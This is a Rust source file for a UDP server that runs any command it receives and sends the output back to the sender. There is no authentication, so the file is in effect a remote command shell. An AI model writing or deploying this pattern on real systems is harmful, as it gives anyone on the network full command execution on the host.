use std::net::UdpSocket;
use std::str;
use std::error::Error;
use crate::system::utils as system_utils;

struct OtherInfo<'a> {
    socket: &'a UdpSocket,
    addr: std::net::SocketAddr,
}

fn send_output(other: OtherInfo, s: String) -> Result<(), Box<dyn Error>> {
    other.socket.send_to(s.as_bytes(), other.addr)?;
    Ok(())
}

fn handle_msg(other: OtherInfo, msg: &[u8], num_bytes: usize) -> Result<(), Box<dyn Error>> {
    // Get only the first num_bytes characters    
    let mut s = Vec::new();
    for c in 0..num_bytes {
        s.push(msg[c]);
    }
    
    // Turn array to string
    let mut command = String::new();
    match str::from_utf8(&s) {
        Ok(com) => command = com.to_string(),
        Err(_) => (),
    };

    println!("Received [{}] from [{}]", command, other.addr.ip().to_string());

    // Execute command
    let out = match system_utils::execute_command(&command) {
        Ok(output) => output.to_string(),
        Err(_) => String::from("Invalid command, no result"),
    };
    
    // Send output to server
    send_output(other, out)?;

    Ok(())
}

pub fn start_server(ip: &str, port: &str) -> Result<(), Box<dyn Error>> {
    println!("Listening on {}:{}", ip, port);

    loop {
        let socket = UdpSocket::bind(format!("{}:{}", ip, port))?;

        let mut buf = [0; 128];
        let (num_bytes, src_addr) = socket.recv_from(&mut buf)?;

        let other = OtherInfo {socket: &socket, addr: src_addr};
        
        let clean_buf = str::from_utf8(&buf)?
            .trim_matches('\0')
            .trim_matches('\n')
            .as_bytes();

        println!("[{} != {}]", str::from_utf8(&buf)?, str::from_utf8(clean_buf)?);

        handle_msg(other, clean_buf, clean_buf.len())?;
    }
}